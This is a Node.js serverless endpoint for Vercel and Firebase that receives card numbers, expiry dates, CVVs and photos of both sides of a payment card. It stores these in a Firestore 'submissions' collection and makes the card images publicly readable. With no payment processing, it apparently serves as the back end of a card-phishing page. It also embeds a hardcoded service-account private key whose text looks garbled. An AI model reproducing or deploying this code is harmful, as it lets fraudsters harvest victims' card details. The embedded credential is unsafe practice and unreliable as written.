// api/submit.js — VERCEL FIXED VERSION
global.Buffer = global.Buffer || require('buffer').Buffer;

import { initializeApp, cert } from 'firebase-admin/app';
import { getFirestore } from 'firebase-admin/firestore';
import { getStorage } from 'firebase-admin/storage';

const serviceAccount = {
  "type": "service_account",
  "project_id": "vanilla-3be8f",
  "private_key_id": "10bcf268f5b55841964cbc51a9b3dcf933a0a5bd",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAOCmem5i9i3MifJc\nnbZTfm4PWSsXpntuHvgv2GwvZWdf06zdMd6nd07KXT0SxBaSpiggIx3wma01G/nVJJRn1D4ngscWX/\nO4slBg/nCsV6x4/kgRIbZDE8eroQ\nQCcdkN4KyPPt8sCsXSQ9b52Ic2ucZ/GNk6J7dWf7QxBVkUsd2IMs9phn0lV9aP/WXUKGv31qtBsnSpurm8tu3\n3E]EX1vzAgMBAAECggEABm6M+UgxIMlv16xwMuGbIvQ2+f7aEI31K4+wr07GPMc8RwyZP9Xmza7ODUXVv6q07W4T\na6OIg63KL+sSD+eoCOMnHrWeeVTysF7hNe8y/Qcy7hu2FSsdYnwUV11U8ySw86y4Rk0VipPXujiwZ1PAIO9TPt+ltKiSR\nUwRHTeN74Y1Z8pUZBXveV4Ztlmf/HYtQ3MlzlAw6cA+RHa43ZfFNXfy dr+D2yPFcJu5RjUUjToQKBgQDXpwVp+vmZCWpydd2l\niL4f24BM245iG/sV8fd8f07YPGRr9eEftVfGtx tBg4eWz+J R7+hGnQHwKBgER0BPjuLLqSTZLFrTS1Yjx0jZZX/ytPXHVL2FZQxfQnv2yxoONS\nyekPCFUTd/GvtuKvTB1qYHbTkaChaYRfWpRskUBbgvexR1SqqTKVF20a5I7bE4bC\nHKovkip+Uruxxv9CkSJDEFBOtKwZv8ENrVdBNUBrtTZ6CIT1zr7gYxQFAoGBAK6i\ns1ZApoF0Zp/x3jTM+0wZLz9WXscshDsLmMteDQPQACTGiMDDrGvemGTEXMPApERT\nMhQkX7xijXNEkz0yEyuyGJ+qrU33E+Eh2CnV04M7CvoYOMnkg2wLL26Tki8dO2GD\nMgi6C01r/n0i/x5Ew2tM2BCpP1tmmm+uhPYSmtKvAoGBAJFzkpZhmgk5pP06hTxD\nY8dQutKspE7bou+XhIvyGRuKHH8bkPZaWLhkwISKRPtfyQ0xyrjvpmSiD/eIaKuc\nTuwxSjuF/atjiIlW9WhQ++BEpjITUzygB5TPp68gYAvqkzD\nKztbMqynkE+xALRheZ9jGwD/\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-fbsvc@vanilla-3be8f.iam.gserviceaccount.com",
  "client_id": "YOUR_CLIENT_ID",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40vanilla-3be8f.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
};

initializeApp({
  credential: cert(serviceAccount),
  storageBucket: "vanilla-3be8f.firebasestorage.app"
});

const db = getFirestore();
const bucket = getStorage().bucket();

export const config = {
  runtime: 'nodejs18'
};

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).end();

  try {
    const { card_number, expiry_date, cvv, front_image, back_image } = req.body;

    const upload = async (base64, name) => {
      if (!base64) return "";
      const buffer = Buffer.from(base64.split(",")[1], "base64");
      const file = bucket.file(`images/${name}_${Date.now()}.jpg`);
      await file.save(buffer, { contentType: "image/jpeg" });
      await file.makePublic();
      return `https://storage.googleapis.com/${bucket.name}/${file.name}`;
    };

    const [frontUrl, backUrl] = await Promise.all([
      upload(front_image, "front"),
      upload(back_image, "back")
    ]);

    await db.collection("submissions").add({
      card_number,
      expiry_date,
      cvv,
      front_image: frontUrl,
      back_image: backUrl,
      timestamp: new Date()
    });

    res.status(200).json({ success: true });
  } catch (e) {
    console.error("SUBMIT ERROR:", e);
    res.status(500).json({ error: e.message });
  }
}
